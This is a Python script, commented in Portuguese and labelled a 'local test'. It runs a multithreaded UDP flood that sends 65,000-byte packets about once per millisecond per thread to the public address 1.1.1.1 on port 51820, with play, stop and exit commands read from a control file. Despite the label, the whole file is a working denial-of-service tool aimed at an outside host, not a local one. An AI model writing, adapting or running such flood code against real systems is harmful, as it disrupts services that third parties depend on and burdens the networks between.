import socket
import threading
import time
import os

# ==========================================
# CONFIGURACAO DO TESTE LOCAL
# ==========================================

TARGET_IP = "1.1.1.1"
TARGET_PORT = 51820
NUM_THREADS = 4
PACKET_SIZE = 65000

COMMAND_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "command.txt"
)

# ==========================================
# CONTROLE
# ==========================================

running = threading.Event()
running.set()

stopping = threading.Event()


# ==========================================
# WORKER
# ==========================================

def worker():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = bytes(PACKET_SIZE)

    try:
        while not stopping.is_set():

            if running.is_set():
                try:
                    sock.sendto(data, (TARGET_IP, TARGET_PORT))
                except OSError:
                    pass

                time.sleep(0.001)

            else:
                time.sleep(0.1)

    finally:
        sock.close()


# ==========================================
# LEITOR DE COMANDOS
# ==========================================

def command_loop():
    ultimo_comando = ""

    while not stopping.is_set():

        try:
            if os.path.exists(COMMAND_FILE):

                with open(
                    COMMAND_FILE,
                    "r",
                    encoding="utf-8"
                ) as file:
                    comando = file.read().strip().lower()

                # Evita executar o mesmo comando varias vezes
                if comando and comando != ultimo_comando:
                    ultimo_comando = comando

                    if comando == "stop":
                        running.clear()
                        print("STOP - teste pausado.", flush=True)

                    elif comando == "play":
                        running.set()
                        print("PLAY - teste continuando.", flush=True)

                    elif comando == "exit":
                        running.clear()
                        stopping.set()
                        print("EXIT - encerrando.", flush=True)

                    else:
                        print(
                            "Comando desconhecido: " + comando,
                            flush=True
                        )

        except (OSError, UnicodeDecodeError):
            pass

        time.sleep(0.1)


# ==========================================
# INICIO
# ==========================================

print("Teste local iniciado.", flush=True)
print("PID:", os.getpid(), flush=True)
print("Arquivo de controle:", COMMAND_FILE, flush=True)

# Remove comando antigo
try:
    if os.path.exists(COMMAND_FILE):
        os.remove(COMMAND_FILE)
except OSError:
    pass


# Cria as threads
threads = []

for _ in range(NUM_THREADS):
    thread = threading.Thread(
        target=worker,
        daemon=True
    )

    thread.start()
    threads.append(thread)


# Thread de comandos
command_thread = threading.Thread(
    target=command_loop,
    daemon=True
)

command_thread.start()


print("Comandos disponiveis:", flush=True)
print("stop  = parar", flush=True)
print("play  = continuar", flush=True)
print("exit  = encerrar", flush=True)


# ==========================================
# LOOP PRINCIPAL
# ==========================================

try:
    while not stopping.is_set():
        time.sleep(0.5)

except KeyboardInterrupt:
    stopping.set()
    running.clear()


# ==========================================
# FINALIZACAO
# ==========================================

stopping.set()
running.clear()

for thread in threads:
    thread.join(timeout=1)

print("Processo finalizado.", flush=True)